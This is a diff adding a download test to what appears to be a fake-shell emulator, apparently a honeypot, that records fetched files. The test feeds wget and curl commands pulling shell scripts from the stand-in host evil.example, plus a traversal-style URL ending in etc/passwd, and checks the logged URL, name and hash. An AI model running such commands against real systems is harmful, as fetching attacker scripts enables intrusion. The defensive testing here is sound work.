@@ -25,6 +25,20 @@ def test_errors():
     assert "No such file" in sh.run("cd /nope")
 
 
+def test_download():
+    sh = FakeShell()
+    out = sh.run("wget http://evil.example/x.sh -O x.sh")
+    assert "x.sh saved" in out
+    d = sh.downloads[0]
+    assert d["url"] == "http://evil.example/x.sh"
+    assert d["name"] == "x.sh"
+    assert len(d["sha256"]) == 64
+    sh.run("curl -O http://evil.example/y.sh")
+    assert sh.downloads[1]["name"] == "y.sh"
+    sh.run("wget http://evil.example/../../etc/passwd")
+    assert sh.downloads[2]["name"] == "passwd"
+    
+
 def test_exit():
     sh = FakeShell()
     sh.run("exit")
